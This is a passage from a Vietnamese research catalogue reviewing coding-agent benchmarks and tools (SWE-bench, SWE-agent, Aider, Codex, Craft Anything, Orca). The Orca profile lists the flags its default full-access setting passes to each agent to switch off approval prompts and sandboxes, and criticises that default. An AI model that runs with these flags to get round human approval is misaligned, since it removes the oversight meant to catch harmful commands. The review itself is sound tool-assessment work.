| `SWE-bench/SWE-bench` | Cổng máy (harness gốc) | 6.133 · MIT | 2/9/2026 (HEAD `02e7a74`) | Bộ chấm Docker gốc: `swebench eval`, `swebench report` chấm lại log không cần container, `swebench infer` chạy mini-SWE-agent, `swebench dataset check` cho task tự tạo; `infra_failure.py` tách "môi trường hỏng" khỏi "patch sai" mà không đổi mẫu số | Verified đã bão hòa (§2); bản *Unreleased* đổi đường dẫn log (`logs/evaluation/<run_id>`); `__version__` 5.0.2 nhưng CHANGELOG mới ghi tới 5.0.1 |
| `scaleapi/SWE-bench_Pro-os` | Cổng máy (kế nhiệm) | 557 · MIT | 22/9/2026 (`66f9276`) | V2 (22/9/2026): 642 task, 11 repo, đóng gói **định dạng Harbor**; tập HARD-51; **locked protocol**: pha agent không mạng (chỉ cho phép endpoint của model, tắt WebFetch/WebSearch), verifier chạy ở sandbox mới (image sạch) chỉ với `git diff` (`model.patch`) và vẫn có mạng; `GATE.md` công bố oracle 642/642 pass và patch rỗng 642/642 fail | Bản V1 giữ ở config `v1`; README (18/5) tự ghi leaderboard từng có vấn đề; khuyến nghị Modal, Docker cục bộ còn "Beta"; tập riêng thương mại không công khai |
| `microsoft/SWE-bench-Live` | Cổng máy (chống nhiễm) | 261 · MIT | 25/9/2026 (`62d0293`) | Tập tự cập nhật: Python +50 task/tháng, MultiLang 1.077 task/8 ngôn ngữ (21/8/2026), có tập **Windows/PowerShell**; kèm mã curation (RepoLaunch) để dựng task + sandbox cho repo riêng | Badge license trong README trỏ nhầm sang repo SWE-bench (LICENSE thật là MIT của Microsoft); thư mục `launch/` rỗng ở bản clone (có thể là submodule) **(chưa xác minh)** |
| `multi-swe-bench/multi-swe-bench` | Cổng máy (đa ngôn ngữ) | 364 · Apache-2.0 | 18/12/2025 (`24f493f`) | ByteDance Seed, NeurIPS 2025: issue thật cho Java, TS/JS, Go, Rust, C/C++; có bản `mini` (400) và `flash` (300) để chạy rẻ | **Đứng yên ~10,5 tháng**; dữ liệu trên HF; dùng làm tập phụ, không làm cổng chính |

**Stack nâng trần** (lợi ích/công sức giảm dần)

1. **Cổng hồi quy harness**: mỗi lần đổi prompt/tool/model của agent (§1.1, §3j), chạy `swebench eval` trên 20–50 task cố định + `swebench report` để chấm lại; luôn kèm chạy `--gold` (oracle) và patch rỗng trên cùng máy, mượn cách công bố của `GATE.md` SWE-bench Pro, để tách lỗi hạ tầng khỏi lỗi agent.
2. **Chấm agent đóng gói bằng Harbor** (mục 07): dùng task V2 của SWE-bench Pro với `locked_claude_code`/`locked_codex`/`locked_mini_swe` để so CLI agent (§1.1) trong cùng điều kiện không mạng.
3. **Chống nhiễm dữ liệu**: lấy lát cắt mới nhất của SWE-bench-Live cho model ra sau ngày cắt dữ liệu của Verified; thêm tập Windows nếu sản phẩm chạy trên Windows.
4. **Benchmark nội bộ**: dùng mã curation của SWE-bench-Live hoặc `swebench dataset check` để biến PR đã merge của chính dự án thành task FAIL_TO_PASS, chạy định kỳ trên `AGENTS.md` (mục 04) của dự án.
5. **Đa ngôn ngữ**: chỉ khi stack không phải Python, thêm `flash`/`mini` của Multi-SWE-bench hoặc MultiLang của SWE-bench-Live.

**Nguồn §3k:** GitHub search API 2/11/2026 (`repo:` cho 4 repo trên; `repo:agentsmd/agents.md`, `repo:harbor-framework/harbor` đã có trong catalog) · clone 2/11/2026, đọc: SWE-bench (README.md, LICENSE, CHANGELOG.md, `swebench/__init__.py`, `swebench/cli/`, `swebench/harness/{run_evaluation,grading,infra_failure}.py`) · SWE-bench_Pro-os (README.md, LICENSE, `v2/README.md`, `v2/GATE.md`) · SWE-bench-Live (README.md, LICENSE, `curation/`, `evaluation/`) · multi-swe-bench (README.md, LICENSE, cây `multi_swe_bench/`) · https://github.com/SWE-bench/SWE-bench · https://github.com/scaleapi/SWE-bench_Pro-os · https://github.com/microsoft/SWE-bench-Live · https://github.com/multi-swe-bench/multi-swe-bench · https://arxiv.org/abs/2505.23419 · https://arxiv.org/abs/2504.02605

<a id="core-coding-contracts"></a>

## 3l. Nâng trần 2/11/2026: hợp đồng sửa mã và cổng chấp nhận độc lập (mở rộng cùng ngày)

> Mở rộng chiều sâu trong cùng đợt 2/11/2026, không phải công bố các repo vừa ra mắt. Hai repo dưới đã có trong catalog: đọc lại LICENSE, CI và nhánh mặc định bằng clone chỉ đọc; SHA đối chiếu GitHub API. Mức bằng chứng **code-read**; không chạy/build repo ngoài, hiệu năng và hành vi thực tế **(chưa xác minh)**. Số sao/trạng thái đọc 2026-11-02; ngày commit tính theo UTC, tách khỏi `pushed_at`.

| Repo đã có | ★ · license (2026-11-02) | HEAD nhánh mặc định | Vai trò đọc sâu |
|---|---|---|---|
| `SWE-agent/SWE-agent` | 20.711 · MIT | 2026-07-16 · `3ea751c0` | Vòng giải issue và phân biệt patch với kết quả chấm |
| `Aider-AI/aider` | 49.898 · Apache-2.0 | 2026-05-22 · `5dc9490b` | Sửa mã có git. lint/test và checkpoint cho người review |

**Trần còn thiếu:** §3k đã có harness chấm SWE-bench; bảng §1 vẫn dễ khiến người đọc đồng nhất “agent đã commit/submit” với “bản sửa đạt yêu cầu”. Cần so **hợp đồng chỉnh sửa**, trạng thái kết thúc và bằng chứng test của agent trước khi so điểm benchmark.

### SWE-agent: trạng thái kết thúc phải đi cùng trạng thái chấm

- Trong [`attempt_autosubmission_after_error`](https://github.com/SWE-agent/SWE-agent/blob/3ea751c087f32b16e039a2233dd6eefecef325d5/sweagent/agent/agents.py#L823), lỗi vẫn có thể dẫn tới lấy diff cuối hoặc chạy `git add -A`/xuất patch rồi submit. Đây là cách cứu artifact khi runtime chết; **có patch không chứng minh task đã giải đúng**. Hồ sơ sử dụng cần giữ riêng `exit_status`, patch, lỗi hạ tầng và điểm từ bộ chấm §3k.
- [CI pytest](https://github.com/SWE-agent/SWE-agent/blob/3ea751c087f32b16e039a2233dd6eefecef325d5/.github/workflows/pytest.yaml) kiểm **chính SWE-agent**, không tự chứng minh patch sinh cho repo khác đúng. Paper ACI giải thích thiết kế giao diện quan sát/hành động; điểm paper không thay lần chạy trên bộ task và phiên bản model hiện tại.
- **Đính chính bảo trì:** API `pushed_at` là 26/10/2026 nhưng HEAD `main` là **16/7/2026**. Không dùng riêng ngày push để kết luận “bảo trì đều 10/2026”; nhánh khác hoặc tag có thể tạo push mà main không đổi. Cần kiểm release và task tương thích trước khi dùng làm nền mới.

### Aider: commit có thể xuất hiện trước lint/test

- [`base_coder.py`](https://github.com/Aider-AI/aider/blob/5dc9490bb35f9729ef2c95d00a19ccd30c26339c/aider/coders/base_coder.py#L1585) gọi `auto_commit(edited)` ngay sau áp sửa, rồi mới lint và test. Mặc định `auto_lint=True`, **`auto_test=False`**. Nếu cần vòng sửa–test, phải cấu hình `--test-cmd` và bật `--auto-test`; `--test-cmd` đơn lẻ chưa có nghĩa tự chạy sau mọi lần sửa.
- Git tạo checkpoint dễ review/undo, nhưng một commit của Aider không phải chứng nhận chất lượng. [CI Ubuntu](https://github.com/Aider-AI/aider/blob/5dc9490bb35f9729ef2c95d00a19ccd30c26339c/.github/workflows/ubuntu-tests.yml) có ma trận Python 3.10–3.14; đây là bằng chứng cấu hình kiểm upstream, **(chưa xác minh)** kết quả từng run. Nhánh main vẫn ở 22/5/2026; cân nhắc tương thích model/dependency mới.
- [Analytics](https://github.com/Aider-AI/aider/blob/5dc9490bb35f9729ef2c95d00a19ccd30c26339c/aider/analytics.py#L84) chưa khởi tạo client gửi khi chưa có trạng thái opt-in. Đây là đọc đường mã, không phải kết luận đã bắt gói mọi kênh mạng.

**Ma trận chọn và cổng chấp nhận**

| Nhu cầu | Chọn/ghép | Bằng chứng tối thiểu trước khi chấp nhận |
|---|---|---|
| Pair programming, người review từng diff | Aider + git worktree | Diff đúng phạm vi; test/lint do môi trường dự án chạy lại |
| Giải issue có môi trường container | SWE-agent + SWE-bench/Harbor (§3k, mục 07) | Artifact chấm độc lập; phân lỗi hạ tầng khỏi patch sai |
| Agent chạy tự trị lâu | Agent hiện có + durable runtime mục 21 | Timeout, ngân sách, receipt của side effect; không lấy chuỗi `submitted` làm pass |
| So hai harness/model | Cùng tập task và giới hạn tài nguyên | Báo solved/attempted, lỗi hạ tầng, chi phí mỗi task giải đúng, p95 thời gian |
| Thử trên repo đang có thay đổi người dùng | Worktree sạch riêng cho mỗi run | Base SHA, diff người dùng tách riêng; không cho autosubmit gom file ngoài phạm vi |

**Cách ghép:** (1) đóng băng base SHA, tập task, model/config và budget; (2) chạy agent trong môi trường cách ly, lưu trajectory/exit reason; (3) đưa patch sang bộ chấm độc lập §3k, chạy cả test hồi quy; (4) đánh giá chi phí trên **task đạt yêu cầu**, rồi người review diff trước tích hợp. Khi chưa chạy benchmark, chỉ kết luận về cơ chế đọc được; chưa xếp hạng agent.

**Nguồn phần mở rộng:** [1](https://github.com/SWE-agent/SWE-agent/blob/3ea751c087f32b16e039a2233dd6eefecef325d5/LICENSE) · [2](https://github.com/SWE-agent/SWE-agent/blob/3ea751c087f32b16e039a2233dd6eefecef325d5/sweagent/agent/agents.py) · [3](https://github.com/SWE-agent/SWE-agent/blob/3ea751c087f32b16e039a2233dd6eefecef325d5/.github/workflows/pytest.yaml) · [4](https://github.com/Aider-AI/aider/blob/5dc9490bb35f9729ef2c95d00a19ccd30c26339c/LICENSE.txt) · [5](https://github.com/Aider-AI/aider/blob/5dc9490bb35f9729ef2c95d00a19ccd30c26339c/aider/coders/base_coder.py) · [6](https://github.com/Aider-AI/aider/blob/5dc9490bb35f9729ef2c95d00a19ccd30c26339c/aider/analytics.py) · [7](https://github.com/Aider-AI/aider/blob/5dc9490bb35f9729ef2c95d00a19ccd30c26339c/.github/workflows/ubuntu-tests.yml) · [8](https://arxiv.org/abs/2405.15793) · [9](https://aider.chat/docs/usage/lint-test.html)

## 3m. Hồ sơ storytold/craft-anything (Craft Anything): engine dịch ngược bằng Rust + coding agent dựng lại website, app, game (ảnh README người dùng gửi, đọc mã 3/11/2026)

> Ảnh là phần đầu README: logo ArtCraft, icon con quạ, "Craft Anything", badge "100% Rust · macOS · Windows · Linux · FreeBSD · Web native · MIT / Apache-2.0 · early alpha", ảnh chụp app với nút "Clean room" và thẻ xin quyền "May I run a command: `curl https://example.com/robots.txt`?". Đã clone `--filter=blob:none` đủ lịch sử, HEAD `8638d6b72be3e99dcc73b06f92a8c113932c75f7` (2/11/2026, tag v0.3.0). **Không cài, không build, không chạy.** Cùng tổ chức với FilmCraft (§3d) và ArtCraft Launcher (§3e).

### 3m.1 Hồ sơ nhanh

| Thuộc tính | Giá trị (3/11/2026) |
|---|---|
| Repo | https://github.com/storytold/craft-anything · **4.178★, 686 fork, 134 issue+PR mở** (GitHub search API). Tạo 31/10/2026 |
| Mô tả | "See how any website, app or game works, then have AI build your own version": quy trình Study → Build → Check → Ready. Engine dịch ngược tự viết, sau đó một coding agent (mặc định Claude Code của chính người dùng) dựng dự án mới và so với bản gốc |
| License | **MIT OR Apache-2.0** (`LICENSE-MIT`, `LICENSE-APACHE`, `NOTICE`). Logo và tên ArtCraft **không** thuộc license mã: `docs/brand/LICENSE-brand.txt` ghi là nhãn hiệu, chỉ cho dùng nguyên bản trong bản copy của repo, fork không được dùng |
| Lịch sử | **211 commit trong 4 ngày** (31/10 → 3/11: 12, 41, 133, 25). `BFlat` 85 commit, `GGWA` 19, Brandon Thomas 18, `phatloi0010` 17; 18 trailer Co-Authored-By Claude. 3 tag v0.1.0–v0.3.0 |
| Mã | 379 file `.rs` trên tổng 622 file. Badge "100% Rust" đúng với mã ứng dụng (ngoài ra chỉ có script `.sh`/`.ps1` để đóng gói). Các crate chính: `engine` (89 file), `formats`, `ai`, `ui-egui`, `engines`, `disasm`, `mcp`, `evidence`, `js`; app desktop, CLI và bản web (WASM) |
| Công cụ | README tự nhận **314 tool** (298 trong engine), mỗi tool là một lệnh CLI và một tool MCP: native, .NET, Java, Android, Apple, Electron/JS, website, firmware, pcap, DB, file game. Có disassembler/decompiler riêng, dùng thêm Ghidra nếu máy đã cài **(số tool chưa đếm lại)** |
| AI | Builder chạy chương trình `claude` của người dùng với tài khoản của họ (`docs/claude-code.md`). Có adapter Codex (chưa chạy thật) và ACP (Gemini CLI, Qwen Code, opencode, goose, Hermes, Maki; chỉ Maki đã chạy thật). Hỏi đáp qua Anthropic/OpenAI/OpenRouter/server cục bộ. Ảnh và 3D sinh bằng fal.ai: opt-in, dùng key của người dùng |
| Trạng thái | "early alpha". Chưa có bản phát hành công khai; installer cho Windows/macOS/Linux/FreeBSD mới được dựng trong CI |

### 3m.2 Đọc mã: điểm tốt

- **Clean room thực thi bằng allowlist trong engine, không chỉ nằm trong prompt.** `crates/engine/src/clean_room.rs` liệt kê các tool chạy được khi Deep mode tắt (chỉ nhìn từ ngoài: ảnh chụp, layout hiển thị, ảnh cửa sổ, bản ghi chạy). Mỗi lần gọi tool đều qua `crates/engine/src/lib.rs:250` (`if session.clean_room() && !clean_room::allows(id) → refusal`). Tool mới, kể cả tool từ plugin, **mặc định chỉ chạy ở Deep** cho đến khi được thêm vào danh sách, tức là fail-closed. `deep_mode` mặc định `false` (`settings.rs:200`). Có test cho cả hai chế độ (`rebuild/tests.rs:765`, `:1613`).
- **Builder Claude Code bị giới hạn công cụ.** `crates/ai/src/cli_agents/adapters.rs` chạy `claude -p` với `--strict-mcp-config` và `--allowedTools mcp__craft-anything__*`, chỉ thêm `Read/Glob/Grep/TodoWrite` khi đọc file không đi qua MCP. Quyền được hỏi qua `--permission-prompt-tool` (thẻ duyệt trong app, đúng như trong ảnh). Chế độ hỏi đáp chặn các tool thay đổi trạng thái (`--disallowedTools` + `CHANGING_TOOLS`) và tắt lưu phiên.
- **Kết quả là bản ghi bằng chứng** (confidence, coverage, limitations), có ledger "unknowns" và báo cáo ghi rõ chế độ (`mode_words`: "Clean room (nothing inside the original was read)").
- Không tìm thấy telemetry trong mã (grep `telemetry|posthog|sentry|analytics`: chỉ thấy bảng nhận diện SDK Sentry **trong game được phân tích**).

### 3m.3 Đọc mã: rủi ro

- ⚠️ **Rủi ro pháp lý nằm ở mục đích sử dụng.** "Recreate this website/game" là tính năng chính. README dặn chỉ dùng trên phần mềm mình sở hữu hoặc được phép xem xét, và ghi agent "được dặn" không chép logo, ảnh, chữ. Nhưng đó là **chỉ dẫn trong prompt**, không phải cổng kiểm trong mã. Deep mode đọc mã, file và JS của bản gốc "for your private use". Dù vậy, điều khoản sử dụng (ToS/EULA) của bên thứ ba và luật bản quyền hay chống dịch ngược nơi người dùng sống vẫn áp dụng. Tên "clean room" chỉ mô tả chế độ thu thập; nó **không** tương đương quy trình clean-room có hai đội tách biệt về mặt pháp lý.
- ⚠️ "It never bypasses DRM, logins or anti-cheat": grep `drm|anti-cheat` trong `crates/` không thấy cơ chế chặn nào. Tuyên bố này dựa vào việc **không có tính năng**, chứ không có cổng từ chối **(suy từ mã, chưa xác minh từng tool)**.
- ⚠️ Adapter **Antigravity** truyền `--dangerously-skip-permissions` ở chế độ builder (`adapters/antigravity.rs:4,18`). Với host này, thẻ duyệt lệnh như trong ảnh không còn tác dụng; chỉ Claude Code đi qua permission-prompt-tool.
- ⚠️ CI gọi reusable workflow `storytold/craft-common-actions/...@main` (5 workflow), **ghim theo nhánh, không theo SHA**, nên ai sửa được repo kia sẽ đổi được pipeline phát hành có ký mã.
- Tuổi đời 4 ngày, nhịp khoảng 50 commit/ngày, alpha. README ghi nhiều phần "built, not yet run live" (API key, agent khác, kiểm hành vi app/game). Đây là mẫu chung của bộ Craft (§3d: FilmCraft có CI không chạy test). Tool ADB (`adb_app_install/remove`) nằm trong danh sách clean room vì chỉ điều khiển thiết bị chứ không đọc mã, nhưng vẫn **thay đổi điện thoại** của người dùng.

### 3m.4 So với công cụ cùng loại

| Công cụ | ★ (3/11/2026) | License | Khác Craft Anything |
|---|---|---|---|
| **storytold/craft-anything** | 4.178 | MIT OR Apache-2.0 | Dịch ngược **và** dựng lại có so khớp. Clean room/Deep thực thi trong engine. App desktop + CLI + MCP |
| `morluto/rea` (mục 23 §6.4) | API trả **422.904★ / 105.451 fork**, con số bất thường **(chưa xác minh)** | MIT | CLI + MCP 95 tool cho agent dịch ngược (Hopper/Ghidra, CDP, sandbox replay JS), Evidence v2. Không có bước "dựng lại" |
| Ghidra (NSA) | – | Apache-2.0 | Bộ dịch ngược chuẩn cho người dùng. Craft Anything gọi nó ở Deep mode nếu máy đã cài |
| Screenshot-to-code / v0 / Lovable (mục 06) | – | khác nhau | Chỉ dựng UI từ ảnh hoặc prompt, không có bước kiểm "giống bản gốc bao nhiêu" ở 3 độ rộng |

### 3m.5 Dùng thế nào

- Bài học đáng lấy cho harness khác: **chế độ quyền là allowlist trong dispatcher**, tool mới mặc định bị khóa, lời từ chối có `reason` máy đọc được kèm hướng bật. Cùng mạch với "fail-closed" ở mục 02 §4g.
- Chỉ dùng trên phần mềm của chính mình hoặc có văn bản cho phép. Giữ **Clean room**, đọc ToS của mục tiêu trước khi bật Deep. Không phát hành bản dựng lại có tên, logo hay nội dung của bên khác.
- Dùng builder Claude Code (đi qua thẻ duyệt), tránh adapter Antigravity khi chưa có sandbox. Chạy trong máy ảo hoặc container, vì builder tự cài phụ thuộc và chạy lệnh.
- Chờ bản phát hành có chữ ký; không cài từ repo nhái (§3d đã ghi trường hợp `filmcraft-app/filmcraft`).

**Nguồn §3m:** ảnh README người dùng gửi 3/11/2026 · clone https://github.com/storytold/craft-anything HEAD `8638d6b72be3e99dcc73b06f92a8c113932c75f7` (README.md, LICENSE-MIT, LICENSE-APACHE, `docs/brand/LICENSE-brand.txt`, `crates/engine/src/{clean_room.rs,lib.rs,settings.rs}`, `crates/ai/src/cli_agents/{adapters.rs,adapters/antigravity.rs}`, `.github/workflows/*.yml`; `git log`, `git shortlog`, `git tag`) · GitHub search API `user:storytold`, `repo:storytold/craft-anything`, `repo:morluto/rea` 3/11/2026.

## 3n. Hồ sơ stablyai/orca (Orca): bàn điều phối nhiều coding agent, mỗi agent một worktree; mặc định chạy agent ở chế độ bỏ qua quyền (ảnh README người dùng gửi, đọc mã 3/11/2026)

> Ảnh là phần đầu README: logo, badge "★ 113k", "downloads 107m", "license MIT", Discord, X, "macOS | Windows | Linux"; câu "The AI Orchestrator for 100x builders. Run Codex, ClaudeCode, OpenCode or Pi side-by-side — each in its own worktree, tracked in one place"; ảnh chụp app desktop (cột workspace và task, phiên Claude Code có dòng "bypass permissions on", phiên Codex có "permissions: YOLO mode") kèm app mobile ("Pair Desktop", "New Worktree"). §1.3 và §3i.1 trước đây chỉ có một dòng bảng; đây là hồ sơ đọc mã. Clone `--filter=blob:none` đủ lịch sử, HEAD `76472f27ce04e1039337dac9b650c7b3004dfc3d` (3/11/2026). **Không cài, không chạy.**

### 3n.1 Hồ sơ nhanh

| Thuộc tính | Giá trị (3/11/2026) |
|---|---|
| Repo | https://github.com/stablyai/orca · **114.095★, 7.211 fork, 7.998 issue+PR mở** (GitHub search API). Tạo 17/3/2026 |
| License | MIT, "Copyright (c) 2026 Lovecast Inc." (repo nằm dưới org `stablyai`; quan hệ pháp lý giữa Lovecast và Stably **chưa xác minh**) |
| Nhịp phát triển | **18.913 commit trong 7,5 tháng** (16/3 → 3/11/2026). Neil 7.157, Brennan Benson 2.780, Jinwoo Hong 2.243, Jinjing 2.165, tài khoản `OrcaWin` 1.757. 2.589 commit có trailer Co-Authored-By Claude. Tag mới nhất v1.4.247, nhưng `package.json` ở HEAD ghi 1.4.214 (lệch số phiên bản). 73 workflow CI. `AGENTS.md` bắt chạy `pnpm check:changed` trước khi push, cấm `--no-verify`, dặn "Don't Poll the CI" |
| Phạm vi | App Electron chạy nhiều CLI agent song song, mỗi agent một git worktree. `src/main/` có adapter cho rất nhiều agent và dịch vụ: Claude, Codex, Gemini, Cursor, Copilot, Amp, Devin, Grok, Hermes, Antigravity, CodeBuddy, Droid…, cùng GitHub, GitLab, Bitbucket, Azure DevOps, SSH, máy ảo tạm, trình duyệt, emulator. Có app mobile và relay đám mây |

### 3n.2 Kiểm ảnh

| Ô trong ảnh | Kết quả | Đối chiếu |
|---|---|---|
| ★ 113k | ✅ | 114.095★ (3/11/2026). §3i.1 ghi 111,7k ngày 31/10 |
| "downloads 107m" | ⚠️ số cũ, tự dựng | Badge là file SVG trong repo (`docs/assets/readme-downloads.svg`), do workflow `readme-downloads-badge.yml` sinh từ tổng lượt tải release, lần cập nhật cuối 13/10/2026. Đây là tổng lượt tải file release (gồm cả bản tự cập nhật), không phải số người dùng |
| "Run Codex, ClaudeCode, OpenCode or Pi … each in its own worktree" | ✅ | Đúng với mô hình worktree; số agent hỗ trợ nhiều hơn bốn cái được nêu |
| Phiên trong ảnh chạy "bypass permissions" / "YOLO mode" | ⚠️ **là mặc định** | Xem 3n.3 |

### 3n.3 Đọc mã: điều quan trọng nhất

- ⚠️ **Agent mặc định chạy với toàn quyền.** `src/shared/default-global-settings.ts:239` đặt `agentPermissionDefault: 'full-access'`. `src/shared/tui-agent-permissions.ts` (`YOLO_TUI_AGENT_ARGS`) ánh xạ "full-access" thành cờ bỏ qua quyền của từng agent: `claude --dangerously-skip-permissions`, `codex --dangerously-bypass-approvals-and-sandbox` (tắt cả sandbox lẫn duyệt), `gemini/cursor/crush/kimi --yolo`, `amp --dangerously-allow-all`, `kiro --trust-all-tools`, `aider --yes-always`, `cline --auto-approve true`… Bước onboarding có công tắc YOLO (`AgentStep.tsx:28`, `yoloPermissions = true`), nhưng công tắc này **mặc định bật**. Người dùng mới bấm "tiếp" là mọi agent trên mọi worktree đều chạy lệnh và sửa file không cần hỏi. Đối chiếu: Craft Anything (§3m) chỉ dùng cờ này cho một adapter; Javis OS (mục 02 §4f) bị kho ghi nhận vì `bypassPermissions` khi không có allowlist.
- **Telemetry có hỏi trước (opt-in).** `src/main/telemetry/consent.ts`: nếu chưa có cài đặt thì `pending_banner` (fail closed); chỉ gửi khi `optedIn === true`; có biến môi trường để ghi đè. `client.ts`: chỉ bản build chính thức có write key PostHog, bản build của contributor không gửi được. Đây là cách làm tốt hơn hẳn các tool "opt-out" (Trail-code mục 16 §2j, codegraph §2f).
- **Điện thoại điều khiển máy tính qua relay, có mã hóa đầu cuối.** `cloud/README.md`: điện thoại và máy tính đều mở WebSocket ra ngoài tới relay của Stably, relay ghép cặp rồi chuyển tiếp khung dữ liệu. App mobile dùng E2EE bằng tweetnacl (`mobile/src/transport/paired-e2ee-*`; ghi chú "Everything is encrypted end-to-end"), máy tính xác thực bằng khóa X25519. Có bản review bảo mật relay ngày 21/10/2026 (`cloud/docs/relay-security-2026-10-21.md`): image relay và push 0 lỗ hổng theo Trivy; Cloud SQL Auth Proxy còn 1 HIGH, provider Terraform còn 12 HIGH; tự ghi "not a claim that every execution path was manually audited". Lưu ý ghép với điểm trên: một điện thoại đã ghép cặp điều khiển được máy đang chạy agent toàn quyền.
- **Hàng tồn rất lớn**: gần 8.000 issue+PR mở, nhịp khoảng 80 commit/ngày, phần lớn do agent viết. Nhiều tính năng mới mỗi ngày nên hành vi đổi nhanh; ghim bản và đọc release notes.

### 3n.4 Dùng thế nào

- Trong onboarding, **tắt công tắc YOLO**, hoặc vào Settings đặt quyền mặc định của agent thành "ask"/"own" trước khi mở repo thật. Nếu cần chạy toàn quyền thì chỉ dùng trong máy ảo tạm hoặc container (Orca có tính năng ephemeral VM).
- Chỉ ghép điện thoại khi cần, và gỡ ghép khi không dùng.
- So với nhóm ADE ở §1.3 (T3 Code, Vibe Kanban, Claude Squad, Conductor): Orca rộng nhất (desktop, mobile, remote runtime, hơn 20 agent) và có telemetry opt-in làm đúng, nhưng mặc định quyền là lỏng nhất.

**Nguồn §3n:** ảnh README người dùng gửi 3/11/2026 · clone https://github.com/stablyai/orca HEAD `76472f27ce04e1039337dac9b650c7b3004dfc3d`: https://github.com/stablyai/orca/blob/76472f27ce04e1039337dac9b650c7b3004dfc3d/README.md · https://github.com/stablyai/orca/blob/76472f27ce04e1039337dac9b650c7b3004dfc3d/LICENSE · https://github.com/stablyai/orca/blob/76472f27ce04e1039337dac9b650c7b3004dfc3d/AGENTS.md · https://github.com/stablyai/orca/blob/76472f27ce04e1039337dac9b650c7b3004dfc3d/src/shared/default-global-settings.ts · https://github.com/stablyai/orca/blob/76472f27ce04e1039337dac9b650c7b3004dfc3d/src/shared/tui-agent-permissions.ts · https://github.com/stablyai/orca/blob/76472f27ce04e1039337dac9b650c7b3004dfc3d/src/renderer/src/components/onboarding/AgentStep.tsx · https://github.com/stablyai/orca/blob/76472f27ce04e1039337dac9b650c7b3004dfc3d/src/main/telemetry/consent.ts · https://github.com/stablyai/orca/blob/76472f27ce04e1039337dac9b650c7b3004dfc3d/src/main/telemetry/client.ts · https://github.com/stablyai/orca/blob/76472f27ce04e1039337dac9b650c7b3004dfc3d/cloud/README.md · https://github.com/stablyai/orca/blob/76472f27ce04e1039337dac9b650c7b3004dfc3d/cloud/docs/relay-security-2026-10-21.md · `docs/assets/readme-downloads.svg` + `.github/workflows/readme-downloads-badge.yml`; `git shortlog`, `git tag` · GitHub search API `repo:stablyai/orca` 3/11/2026.

<a id="factory-coding-policy-2026-11-04"></a>

## 3o. Nâng trần 4/11/2026: coding agent có hợp đồng quyền và bằng chứng chấp nhận cho xưởng phần mềm

> Đọc mã 2026-11-04; mở rộng hồ sơ `openai/codex` đã có, không nhân bản thực thể. OpenAI; Apache-2.0; full SHA `d84c872464aca4821dc5cb548a651651aefd84fa`. Chỉ đọc LICENSE, implementation, callsite và CI; không cài/chạy/build upstream; không cập nhật sao. Các ca nghiệm thu dưới đây là **đề xuất cho repo tích hợp**, chưa được chạy trong `stored`.

**Trần còn thiếu:** §3k–§3l đã tách patch khỏi kết quả chấm. Xưởng còn cần chứng minh lệnh nào agent được chạy, phê duyệt dựa trên đối số nào và liệu một công cụ kiểm policy chỉ in kết quả hay thực sự làm CI thất bại. Chuỗi “approval enabled” trong cấu hình chưa đủ bằng chứng.

### Đọc sâu Codex: phân biệt bộ đánh giá policy với cổng CI

- [`ExecPolicyCheckCommand.run`](https://github.com/openai/codex/blob/d84c872464aca4821dc5cb548a651651aefd84fa/codex-rs/execpolicy/src/execpolicycheck.rs) nạp rules, đánh giá rồi in JSON và trả `Ok(())`. **Quyết định `forbidden` trong JSON không tự khiến subcommand thoát khác 0.** Muốn dùng `codex execpolicy check` làm cổng, consumer phải parse `decision`, xử lý rõ không có match và không lấy exit 0 làm `allow`. Lỗi parse/nạp rules là một trường hợp khác.
- [Ngữ nghĩa prefix rules](https://github.com/openai/codex/blob/d84c872464aca4821dc5cb548a651651aefd84fa/codex-rs/execpolicy/README.md) có `match`/`not_match` được kiểm lúc nạp và quyết định chặt nhất trong các rule khớp. Đây là cách ghim ca hồi quy của chính policy; không phải sandbox chặn mọi side effect. Cùng binary ở đường dẫn tuyệt đối có thể cần `host_executable` và chế độ resolve tương ứng; không giả định basename khớp mọi executable.
- [Callsite runtime](https://github.com/openai/codex/blob/d84c872464aca4821dc5cb548a651651aefd84fa/codex-rs/core/src/exec_policy.rs) còn kết hợp kết quả policy, approval policy và ngữ cảnh sandbox; lệnh không match có đường heuristic. Vì vậy JSON từ CLI kiểm tĩnh không thay bài thử hành vi ở host thật. [`Decision`](https://github.com/openai/codex/blob/d84c872464aca4821dc5cb548a651651aefd84fa/codex-rs/execpolicy/src/decision.rs) cũng phân biệt chặn, xin reviewer và quyết định người dùng; không suy ra “có rule prompt” là đã có người duyệt.

| Phương án | Hợp với xưởng khi | Cổng phải đặt ở repo thực hiện |
|---|---|---|
| Codex + rules/sandbox của host | Cần policy lệnh có thể kiểm lại trước khi chạy | Kiểm cả JSON policy và hành vi chặn thực; giữ policy revision, argv và cwd |
| Aider (§3l) | Người lập trình muốn sửa nhỏ, xem diff và checkpoint | Chạy lại lint/test bên ngoài; commit không là pass |
| SWE-agent + SWE-bench/Harbor (§3k–§3l) | Cần so harness trên tập issue đóng băng | Oracle/patch rỗng, task denominator, lỗi hạ tầng tách riêng |
| IDE agent có người review | Chu kỳ tương tác ngắn, chưa cần điều phối tự trị | Quyền tool theo host; cùng acceptance suite để so với CLI |

**Chuỗi tích hợp đề xuất:** (1) đóng băng base SHA, task, model, rules và giới hạn thời gian/chi phí; (2) kiểm positive/negative cases của rules, bao gồm đường dẫn executable và không match; (3) chạy agent trong môi trường cô lập với thông tin quyền hiệu lực; (4) đưa diff sang môi trường nghiệm thu độc lập ở mục 30, giữ kết quả test theo case; (5) người review phạm vi thay đổi trước khi nhận. Artifact tối thiểu là task ID → base SHA → policy/config hash → diff → log test → quyết định nhận, thay vì chỉ lời agent “đã xong”.

**Tiêu chí nâng trần:** một ca bị cấm phải dừng trước side effect; một ca không match phải có kết quả đã định trước; canary command hợp lệ phải vẫn chạy được. Đo solved/attempted, chi phí trên task được nhận và tỷ lệ phải làm lại. Policy test không chứng minh an toàn của tool/provider bên ngoài; quyền mạng, bí mật và lỗi sandbox cần phép thử riêng ở mục 11–12.

**Nguồn đọc thêm:** [LICENSE](https://github.com/openai/codex/blob/d84c872464aca4821dc5cb548a651651aefd84fa/LICENSE) · [CI nhanh](https://github.com/openai/codex/blob/d84c872464aca4821dc5cb548a651651aefd84fa/.github/workflows/rust-ci.yml) · [CI đầy đủ](https://github.com/openai/codex/blob/d84c872464aca4821dc5cb548a651651aefd84fa/.github/workflows/rust-ci-full.yml). CI nguồn là cấu hình kiểm của Codex, chưa phải kết quả một run hay bằng chứng patch của người dùng đúng.

## 3o. Hồ sơ JetBrains/thinkrail (ThinkRail): IDE bọc agent pi, workspace là git worktree; analytics cơ bản luôn bật, phần bổ sung bật sẵn (ảnh README người dùng gửi, đọc mã 4/11/2026)

